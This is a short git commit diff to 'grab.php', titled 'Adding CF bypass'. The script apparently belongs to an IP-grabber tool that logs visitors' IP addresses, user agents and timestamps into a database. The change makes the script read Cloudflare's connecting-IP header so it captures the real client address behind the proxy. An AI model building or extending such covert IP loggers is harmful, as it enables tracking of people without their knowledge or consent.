4dbb72ad33fe5e0dfca82d91e161a22a6f18ae5f
Hideaki <53636771+HideakiAtsuyo@users.noreply.github.com>
2020-07-04 09:33:33 +0200

    Adding CF "bypass"

--- grab.php
+++ grab.php
@@ -3,9 +3,16 @@
 ob_start();
 require_once 'skid/db.php';
 
-$ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 $timer = date('d/m/Y h:i:s a', time());
+
+$cloudflare = true;
+
+if($cloudflare == true){
+	$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
+} else if($cloudflare == false){
+	$ip = $_SERVER['REMOTE_ADDR'];
+}
 
 $DoubleGrabVerif = $odb->prepare("SELECT COUNT(*) FROM `ips` WHERE `ip` = :ip");
 $DoubleGrabVerif->execute(array(':ip' => $ip));
